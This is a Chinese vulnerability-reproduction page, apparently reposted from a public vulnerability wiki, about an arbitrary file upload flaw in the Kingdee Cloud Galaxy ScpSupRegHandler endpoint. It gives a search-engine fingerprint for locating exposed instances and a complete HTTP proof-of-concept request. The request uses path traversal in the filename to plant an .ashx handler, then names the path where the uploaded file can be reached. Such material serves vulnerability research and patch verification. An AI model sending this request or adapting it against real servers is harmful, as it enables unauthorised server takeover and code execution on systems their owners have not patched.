---
title: "金蝶OA 云星空 ScpSupRegHandler 任意文件上传漏洞"
date: 2026-10-17 09:13:54
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "金蝶OA"
tags:
  - "金蝶OA"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

金蝶OA 云星空 ScpSupRegHandler 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限

## 漏洞影响

金蝶OA 云星空

## 网络测绘

```
app="金蝶云星空-管理中心"
```

## 漏洞复现

登陆页面

![image-20231116140635693](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116140635693.png)

poc

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 973
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061

--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="dbId_v"

.
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FID"

2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
Content-Type: text/plain

&lt;%@ WebHandler Language="C#" Class="TestHandler" %&gt;
        using System;
        using System.Web;
        public class TestHandler : IHttpHandler {
            public void
            ProcessRequest (HttpContext context) {
                context.Response.ContentType= "text/plain";
                context.Response.Write("Test");
            }
            public bool IsReusable {
                get {return false; }
            }
        }
--2ac719f8e29343df94aa4ab49e456061--</code></pre>

</details>

![image-20231116140545666](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116140545666.png)

```
/K3Cloud/uploadfiles/Test.ashx
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%87%91%E8%9D%B6OA-%E4%BA%91%E6%98%9F%E7%A9%BA-ScpSupRegHandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
